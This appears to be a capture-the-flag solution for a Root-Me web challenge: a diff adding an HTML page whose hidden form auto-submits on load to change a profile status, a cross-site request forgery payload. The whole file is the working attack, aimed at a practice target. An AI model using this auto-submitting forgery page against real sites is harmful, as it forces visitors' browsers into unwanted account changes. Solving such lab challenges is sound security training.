@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RaytoEz</title>
+    <script>
+        function submitFormAutomatically() {
+            document.getElementById("csrfForm").submit();
+        }
+        window.onload = submitFormAutomatically;
+    </script>
+</head>
+<body>
+    <form id="csrfForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post">
+        <input type="hidden" name="username" value="test">
+        <input type="checkbox" name="status" value="true" checked>
+    </form>
+</body>
+</html>
